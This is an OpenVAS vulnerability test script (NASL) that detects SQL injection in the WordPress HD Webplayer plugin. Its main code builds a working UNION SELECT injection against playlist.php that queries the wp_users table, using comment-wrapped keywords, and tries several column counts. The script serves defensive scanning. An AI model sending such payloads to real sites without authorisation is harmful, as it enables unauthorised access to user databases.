###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_wordpress_hd_webplayer_plugin_mult_sql_inj_vuln.nasl 5931 2017-04-11 09:02:04Z teissa $
#
# WordPress HD Webplayer Plugin Multiple SQL Injection Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to manipulate
SQL queries by injecting arbitrary SQL code.

Impact Level: Application";

tag_affected = "Wordpress HD Webplayer version 1.1";

tag_insight = "The input passed via the 'id' parameter to
wp-content/plugins/webplayer/config.php and the 'videoid' parameter to
wp-content/plugins/webplayer/playlist.php is not properly sanitised before
being used in a SQL query.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running WordPress with HD Webplayer and is prone to
multiple SQL injection vulnerabilities.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.903039";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 5931 $");
  script_bugtraq_id(55259);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-04-11 11:02:04 +0200 (Tue, 11 Apr 2017) $");
  script_tag(name:"creation_date", value:"2012-08-31 11:50:18 +0530 (Fri, 31 Aug 2012)");
  script_name("WordPress HD Webplayer Plugin Multiple SQL Injection Vulnerabilities");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/50466/");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/78119");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/20918/");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/50466");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/116011/wphdwebplayer-sql.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
port = 0;
dir = "";
url = "";
exploit = "";
players = "";
player = "";

## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

## Iterate over players dir
players = make_list("webplayer", "hd-webplayer");

foreach player(players)
{
  url = dir + '/wp-content/plugins/' + player + '/playlist.php?videoid=1+' +
              '/*!UNION*/+/*!SELECT*/+group_concat'+
              '(ID,0x3a,0x4f70656e564153,0x3a,0x4f70656e564153,0x3b),2,3,4';

  ## Number of columns may be different
  ## Considering columns till 15
  for(i=5; i<=15; i++)
  {
    url = url + ',' + i;

    ## Construct the attack request
    exploit = url + '+from+wp_users';

    if(http_vuln_check(port:port, url:exploit,
                       pattern:">[0-9]+:OpenVAS:OpenVAS", check_header:TRUE,
                       extra_check:make_list("<playlist>", "hdwebplayer.com")))
    {
      security_message(port);
      exit(0);
    }
  }
}
